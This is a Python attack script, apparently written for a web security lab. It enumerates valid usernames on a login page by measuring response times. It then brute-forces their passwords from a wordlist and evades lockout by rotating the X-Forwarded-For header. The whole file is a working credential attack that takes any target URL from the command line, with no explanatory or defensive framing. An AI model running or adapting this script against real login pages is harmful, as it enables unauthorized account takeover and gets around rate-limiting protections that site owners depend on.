import requests
import sys
import urllib3
import time

proxies = {
            "http":"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"
        }

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
num = 1000

def enumerate_usernames(url:str):
    global num
    login_url = url + "/login"
    valid_usernames = []
    with open("./usernames","r") as usernames_file:
        usernames = [username.rstrip() for username in usernames_file]

        for username in usernames:

            headers = {'X-Forwarded-For':  str(num)}

            params = {
                "username":username,
                "password":"You+have+made+too+many+incorrect+login+attempts.+Please+try+again+in+30+minute(s)." # this just to make server take more time , it's kinda weird but , it's what it's :"/ 
            }

            start_time = time.time()
            r = requests.post(login_url , verify=False, proxies=proxies, data=params, headers=headers)
            end_time = time.time()
            if "You have made too many incorrect login attempts. Please try again in 30 minute(s)." in  r.text :
                num +=1
                start_time = time.time()
                r = requests.post(login_url , verify=False, proxies=proxies, data=params, headers=headers)
                end_time = time.time()


            time_taken = end_time - start_time
            if time_taken >= 4 :
                valid_usernames.append(username)
                print(f"(+) This Might be a valid user name {username}")
                
        return valid_usernames


def brute_force_passwords(usernames:list,url:str):
    global num
    login_url = url+ '/login'
    with open("./passwords","r") as passwords_file:
        passwords = [password.rstrip() for password in passwords_file]
    valid_creds = {}
    for username in usernames:
        for passwd in passwords:
            headers = {'X-Forwarded-For': str(num)}
            params = {
                "username":username,
                "password" : passwd
                }

            r = requests.post(login_url,verify=False,proxies=proxies,data=params,headers=headers ,  allow_redirects=False)

            if "You have made too many incorrect login attempts. Please try again in 30 minute(s)." in  r.text :

                num +=1
                r = requests.post(login_url , verify=False, proxies=proxies, data=params, headers=headers,  allow_redirects=False)
                
            # print(r.url)
            if r.status_code == 302:
                redirected_url = r.headers.get("Location")
                print(f"(+) Redirect detected for {username}:{passwd}, redirected to: {redirected_url}")
                valid_creds[username] = passwd
                break  # Stop after finding the correct password for this username


    return valid_creds
            



def main():
    
    if len(sys.argv) != 2 :
        print(f"(-) Usage {sys.argv[0]} example.com ")
        sys.exit(-1)
    base_url = sys.argv[1]
    print("(+) Enumerating Usernames..")
    usernames = enumerate_usernames(base_url) #  ['mysql', 'user'] 
    print(f"(+) This might be valid usernames:{usernames}")

    print("########################")

    print("(+) Brute-Forcing Passwords")
    valid_creds = brute_force_passwords(usernames=usernames , url=base_url)
    
    print("(+) Valid Credentials we Have found is \n")
    print(valid_creds)
    print("(+) Brute-Forcing  Done ..")




if "__main__" == __name__:
    main()